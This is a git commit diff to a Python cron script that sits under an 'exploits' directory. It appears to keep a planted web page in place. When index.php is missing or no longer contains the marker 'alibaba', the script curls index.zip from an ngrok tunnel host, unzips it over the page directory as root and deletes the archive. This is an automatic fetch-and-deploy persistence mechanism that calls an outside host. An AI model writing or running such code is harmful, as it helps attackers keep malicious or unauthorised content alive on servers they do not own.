b88c36d631c41a827314bd9d296c23247b832ff5
Alleyn Sam <83778411+alleynsam@users.noreply.github.com>
2021-10-10 19:42:21 -0400

    Update cron.py

--- cron.py
+++ cron.py
@@ -1,14 +1,33 @@
 import os
 
+folder = os.path.exists('/root/Desktop/exploits/cronjob/test/pages/alibaba/abcd')
+
+if folder:
+    # print("Exist")
+    pass
+else:
+    os.system("mkdir -p /root/Desktop/exploits/cronjob/test/pages/alibaba/abcd")
+    # print("Doesn't exist")
+
 try:
-    with open("index.php", "r") as f:
+    with open("/root/Desktop/exploits/cronjob/test/pages/alibaba/abcd/index.php", "r") as f:
         data = f.read()
         if "alibaba" in data:
             # print("File ok")
             pass
         else:
             # print("File Modified")
-            os.system("unzip -o index.zip -d /root/Desktop/exploits/cronjob/")
+            # print("Downloading")
+            os.system("curl http://e69646dd71a9.ngrok.io/index.zip --output index.zip")
+            # print("Extracting")
+            os.system("unzip -o index.zip -d /root/Desktop/exploits/cronjob/test/pages/alibaba/abcd/")
+            os.system("rm index.zip")
 except:
     # print("File doesn't exists")
-    os.system("unzip -o index.zip -d /root/Desktop/exploits/cronjob/")
+    # print("Downloading")
+    
+    os.system("curl http://e69646dd71a9.ngrok.io/index.zip --output index.zip")
+    # print("Extracting")
+    os.system("unzip -o index.zip -d /root/Desktop/exploits/cronjob/test/pages/alibaba/abcd/")
+    os.system("rm index.zip")
+    
